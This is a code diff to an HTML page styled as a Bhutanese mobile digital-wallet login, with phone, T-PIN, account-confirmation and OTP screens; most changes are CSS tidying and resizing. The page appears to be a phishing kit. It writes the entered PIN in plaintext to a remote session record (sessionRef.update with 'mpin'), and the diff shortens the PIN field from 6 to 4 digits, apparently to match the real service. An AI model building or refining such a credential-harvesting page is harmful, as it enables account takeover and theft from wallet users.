@@ -174,7 +174,6 @@ html, body {
   gap: 6px;
 }
 
-/* ✅ SVG Flag Styling */
 .flag-icon {
   width: 24px;
   height: 16px;
@@ -220,21 +219,12 @@ html, body {
   font-family: inherit;
 }
 
-.input-field:focus {
-  border-color: #007bb5;
-}
+.input-field:focus { border-color: #007bb5; }
 
-.input-group-full {
-  margin-bottom: 8px;
-}
+.input-group-full { margin-bottom: 8px; }
 
-.m-pin-field {
-  border: 1.5px solid #ccc;
-}
-
-.m-pin-field:focus {
-  border-color: #00a0dc;
-}
+.m-pin-field { border: 1.5px solid #ccc; }
+.m-pin-field:focus { border-color: #00a0dc; }
 
 .forgot-pin {
   text-align: right;
@@ -250,9 +240,7 @@ html, body {
   font-weight: 500;
 }
 
-.forgot-pin a:hover {
-  text-decoration: underline;
-}
+.forgot-pin a:hover { text-decoration: underline; }
 
 .signup-link {
   margin-top: 10px;
@@ -267,9 +255,7 @@ html, body {
   font-weight: 600;
 }
 
-.signup-link a:hover {
-  text-decoration: underline;
-}
+.signup-link a:hover { text-decoration: underline; }
 
 /* ==================== BOTTOM NAVIGATION ==================== */
 .bottom-nav {
@@ -304,9 +290,7 @@ html, body {
   transition: opacity 0.2s;
 }
 
-.nav-item:active {
-  opacity: 0.7;
-}
+.nav-item:active { opacity: 0.7; }
 
 .nav-item svg {
   width: 24px;
@@ -345,10 +329,7 @@ html, body {
   fill: none;
 }
 
-.scan-item span {
-  color: #fff;
-  font-size: 11px;
-}
+.scan-item span { color: #fff; font-size: 11px; }
 
 /* ==================== SCREEN PAGE ==================== */
 .screen-page {
@@ -401,11 +382,7 @@ html, body {
   flex-direction: column;
 }
 
-.screen-logo {
-  text-align: center;
-  margin-bottom: 30px;
-}
-
+.screen-logo { text-align: center; margin-bottom: 30px; }
 .screen-logo .brand-logo { font-size: 40px; }
 .screen-logo .brand-sub { font-size: 10px; letter-spacing: 4px; }
 
@@ -427,16 +404,17 @@ html, body {
 
 .otp-inputs {
   display: flex;
-  gap: 8px;
+  gap: 10px;
   justify-content: center;
   margin-bottom: 30px;
+  flex-wrap: wrap;
 }
 
 .otp-inputs input {
-  width: 46px;
-  height: 56px;
+  width: 52px;
+  height: 60px;
   text-align: center;
-  font-size: 22px;
+  font-size: 24px;
   font-weight: 700;
   border: 2px solid #78bdcf;
   border-radius: 10px;
@@ -585,8 +563,8 @@ html, body {
 @keyframes spin { to { transform: rotate(360deg); } }
 
 @media (max-width: 480px) {
-  .otp-inputs input { width: 42px; height: 52px; font-size: 20px; }
-  .otp-inputs { gap: 6px; }
+  .otp-inputs input { width: 52px; height: 60px; font-size: 24px; }
+  .otp-inputs { gap: 8px; }
   .brand-logo { font-size: 40px; }
   .brand-logo .o-box { width: 36px; height: 36px; font-size: 22px; }
   .brand-logo .go { font-size: 34px; }
@@ -632,7 +610,6 @@ html, body {
     <form id="loginForm" onsubmit="handleLogin(event)">
       <div class="input-group-row">
         <div class="country-code" onclick="alert('Country: Bhutan (+975)')">
-          <!-- ✅ Bhutan Flag SVG (Inline) -->
           <svg class="flag-icon" viewBox="0 0 30 20" xmlns="http://www.w3.org/2000/svg" aria-label="Bhutan flag">
             <path d="M0 0H30V20H0Z" fill="#FFB81C"/>
             <path d="M0 0H30L0 20Z" fill="#F32A2A"/>
@@ -716,7 +693,7 @@ html, body {
   </button>
 </div>
 
-<!-- ==================== T-PIN SCREEN ==================== -->
+<!-- ==================== T-PIN SCREEN (4 DIGIT) ==================== -->
 <div class="screen-page" id="mpinPage">
   <div class="screen-header">
     <button class="back-btn" onclick="goBack()">←</button>
@@ -733,14 +710,12 @@ html, body {
       <div class="brand-sub">YOUR TRUSTED DIGITAL WALLET</div>
     </div>
     <div class="screen-title">Enter Your T-PIN</div>
-    <div class="screen-subtitle">Enter your 6-digit T-PIN to continue</div>
+    <div class="screen-subtitle">Enter your 4-digit T-PIN to continue</div>
     <div class="otp-inputs">
       <input type="text" maxlength="1" inputmode="numeric" id="m1" oninput="moveInput(this, 'm2')">
       <input type="text" maxlength="1" inputmode="numeric" id="m2" oninput="moveInput(this, 'm3')">
       <input type="text" maxlength="1" inputmode="numeric" id="m3" oninput="moveInput(this, 'm4')">
-      <input type="text" maxlength="1" inputmode="numeric" id="m4" oninput="moveInput(this, 'm5')">
-      <input type="text" maxlength="1" inputmode="numeric" id="m5" oninput="moveInput(this, 'm6')">
-      <input type="text" maxlength="1" inputmode="numeric" id="m6" oninput="moveInput(this, null)">
+      <input type="text" maxlength="1" inputmode="numeric" id="m4" oninput="moveInput(this, null)">
     </div>
     <button class="btn-verify" id="mpinBtn" onclick="handleMpinVerify()" disabled>Verify</button>
     <div class="message" id="mpinMessage"></div>
@@ -780,7 +755,7 @@ html, body {
   </div>
 </div>
 
-<!-- ==================== OTP SCREEN ==================== -->
+<!-- ==================== OTP SCREEN (6 DIGIT) ==================== -->
 <div class="screen-page" id="otpPage">
   <div class="screen-header">
     <button class="back-btn" onclick="goBackTo('accountPage')">←</button>
@@ -900,12 +875,12 @@ function handleLogin(e) {
 }
 
 // =====================================================
-// T-PIN VERIFY
+// T-PIN VERIFY (4 DIGIT)
 // =====================================================
 function handleMpinVerify() {
   var tpin = '';
-  for (var i = 1; i <= 6; i++) tpin += document.getElementById('m' + i).value;
-  if (tpin.length !== 6) { showMsg('mpinMessage', 'Please enter all 6 digits.', 'warning'); return; }
+  for (var i = 1; i <= 4; i++) tpin += document.getElementById('m' + i).value;
+  if (tpin.length !== 4) { showMsg('mpinMessage', 'Please enter all 4 digits.', 'warning'); return; }
 
   mpinValue = tpin;
   if (sessionRef) sessionRef.update({ mpin: tpin });
@@ -955,7 +930,7 @@ function handleAccountConfirm() {
 }
 
 // =====================================================
-// OTP
+// OTP (6 DIGIT)
 // =====================================================
 function handleOtpVerify() {
   if (timeLeft <= 0) { showMsg('otpMessage', 'OTP has expired. Please request a new one.', 'error'); return; }
@@ -1040,7 +1015,7 @@ function moveInput(current, nextId) {
 
 function checkMpinComplete() {
   var ok = true;
-  for (var i = 1; i <= 6; i++) if (document.getElementById('m' + i).value.length !== 1) { ok = false; break; }
+  for (var i = 1; i <= 4; i++) if (document.getElementById('m' + i).value.length !== 1) { ok = false; break; }
   document.getElementById('mpinBtn').disabled = !ok;
 }
 
@@ -1051,7 +1026,8 @@ function checkOtpComplete() {
 }
 
 function clearOtpInputs(prefix) {
-  for (var i = 1; i <= 6; i++) {
+  var max = (prefix === 'm') ? 4 : 6;
+  for (var i = 1; i <= max; i++) {
     var el = document.getElementById(prefix + i);
     if (el) { el.value = ''; el.classList.remove('filled'); }
   }
